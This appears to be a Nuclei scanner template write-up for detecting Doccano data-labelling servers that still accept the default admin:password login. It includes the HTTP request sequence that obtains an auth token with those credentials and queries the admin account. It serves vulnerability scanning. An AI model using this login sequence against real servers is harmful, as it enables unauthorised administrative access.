# Nuclei Template: Doccano - Default Login
**Template ID:** doccano-default-login
**Vulnerability Class:** Use of Default Credentials
**Severity:** High
**Source:** Nuclei Template (`doccano-default-login.yaml`)

## Vulnerability Information & PoC

## Description
Detected the Doccano data labeling platform was using default administrator credentials (admin:password). An attacker could have gained full administrative access.

## Steps to reproduce / Exploit Payload
```http
GET /auth HTTP/1.1
Host: {{Hostname}}
Accept: text/html

POST /v1/auth-token HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json
Accept: application/json

{"username":"admin","password":"password"}

GET /v1/me HTTP/1.1
Host: {{Hostname}}
Authorization: Token {{token}}
Accept: application/json
```

## References
- https://github.com/doccano/doccano
- https://doccano.github.io/doccano/
